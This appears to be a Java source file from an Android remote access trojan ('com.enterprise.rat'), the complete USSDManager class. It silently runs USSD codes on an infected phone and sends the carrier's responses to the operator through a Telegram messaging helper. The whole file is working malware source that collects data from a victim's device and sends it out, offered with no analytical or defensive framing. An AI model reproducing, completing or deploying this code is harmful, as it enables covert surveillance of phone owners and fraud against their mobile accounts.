package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import com.enterprise.rat.utils.TelegramApi;

public class USSDManager {
    private Context context;
    public USSDManager(Context context) { this.context = context; }
    public void sendUSSD(String code) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            tm.sendUssdRequest(code, new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    TelegramApi.sendMessage("<b>📲 USSD Response:</b>\n" + response);
                }
                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    TelegramApi.sendMessage("❌ USSD failed");
                }
            }, new Handler(Looper.getMainLooper()));
        } else TelegramApi.sendMessage("❌ Requires Android 8+");
    }
}
